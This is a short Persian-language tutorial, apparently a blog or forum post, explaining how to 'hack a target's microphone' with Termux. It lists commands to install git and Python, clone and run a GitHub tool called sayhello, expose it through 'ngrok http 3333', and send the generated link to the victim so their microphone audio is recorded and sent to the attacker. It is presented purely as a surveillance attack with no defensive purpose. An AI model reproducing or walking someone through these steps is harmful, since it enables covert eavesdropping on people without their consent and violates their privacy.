مقدمه

یک ابزار برای هک میکروفن تارگت . این ابزار با گرفتن دسترسی میکروفن از تارگت میتونه از میکروفن تارگت صدا ضبط کنه و برای شما توی ترموکس بفرسته

ابزار

کد های ی زیر را به ترتیب و دونه دونه در ترموکس وارد کنید و اینتر را بزنید

pkg install git

pkg install python

pkg install python2

pkg install python3

با این دستور نصبش میکنیم

git clone https://github.com/d093w1z/sayhello.git

با این دستور وارد پوشش میشیم

cd sayhello

و با این دستور ابزار رو اجرا میکنیم

bash sayhello.sh

اینتر رو ک بزنید دوتا گزینه میاد

1 .net برای دریافت لینک

2 ngrok برای دریافت لینک

هست ngrok پیشنها من

وقتی بزنید ۲ اینتر رو بزنید و یه سوال میپرسه و دوباره اینتر رو بزنید از چند ثانیه باید یه صفحه جدید باز کنید

انگشتتون رو بزارید سمت چپ صفحه گوشی توی ترموکس و بکشید به سمت راست یه صفحه باز میشه که دوتا گزینه داره و باید بزنید روی گزینه سمت راست و یه صفحه جدید باز میشه

حالا باید لینک رو بسازید تو ضفحه جدید این دستور رو وارد کنید

ngrok http 3333

حالا لینک رو کپی کنید و به تارگت بدید
